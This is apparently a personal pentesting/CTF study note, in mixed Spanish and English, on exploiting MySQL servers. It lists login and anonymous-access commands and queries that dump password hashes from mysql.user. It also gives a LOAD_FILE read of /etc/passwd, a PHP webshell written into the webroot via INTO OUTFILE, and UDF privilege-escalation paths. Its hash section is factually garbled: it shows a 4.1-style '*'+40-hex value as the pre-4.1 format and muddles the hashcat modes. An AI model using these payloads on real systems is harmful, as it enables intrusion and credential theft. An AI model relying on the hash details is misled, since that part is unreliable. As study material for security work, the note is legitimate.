---
aliases:
  - "MariaDB"
  - "Oracle"
  - "phpmyadmin"
  - "Database Service Exploitation"
tags:
  - service/mysql
  - asset/database
kind: Concept
linked:
  - "[[MySQL (3306) - Enumeración]]"
  - "[[SQL Injection (SQLi)]]"
---
# MySQL

> [!info]
> RDBMS open-source. Puerto default `3306`. Targets: dump de DBs, RCE via `INTO OUTFILE` / UDF, credential cracking de hashes.

***

## Conexión

```bash
# CLI auth
mysql -h <target> -P 3306 -u <user> -p

# Connect from CLI con password inline (inseguro pero práctico en CTF)
mysql -h <target> -u root -p'password'

# Test anonymous
mysql -h <target> -u root -e 'SHOW DATABASES;'
```

***

## Comandos útiles intra-sesión

```sql
SHOW DATABASES;
USE <db>;
SHOW TABLES;
DESCRIBE <table>;
SELECT * FROM <table>;
SELECT user, password FROM mysql.user;       -- pre-5.7
SELECT user, authentication_string FROM mysql.user;  -- 5.7+

-- Read file (requiere FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

-- Write file (RCE potencial)
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Version + privilegios
SELECT @@version, current_user(), @@datadir, @@secure_file_priv;
```

***

## Hashes MySQL

- Pre-4.1: `*A4B6157319038724E3560894F7F932C8886EBFCF` (16 chars o `*` + 40)
- 4.1+: SHA1(SHA1(password)) → `*` + 40 hex
- Cracking: hashcat `-m 300` o `-m 200` (4.1 old)

***

## Privesc paths

| Vector | Mecanismo | Notas |
|---|---|---|
| **SQLi → RCE** | `INTO OUTFILE` para escribir webshell | Requiere FILE priv + writable webroot |
| **UDF (User Defined Functions)** | Cargar `.so` malicioso | Requiere control de mysql plugin dir |
| **mysqldump leak** | Credentials en `.mysql_history` | Cred reuse |
| **mysql con `--defaults-file`** | Auth via config file | Recurso para PrivEsc en hosts |

***

## Notas Relacionadas

- [[MySQL (3306) - Enumeración]]
- [[SQL Injection (SQLi)]]
- [[SQLi - Union based]]
- [[sqlmap]]
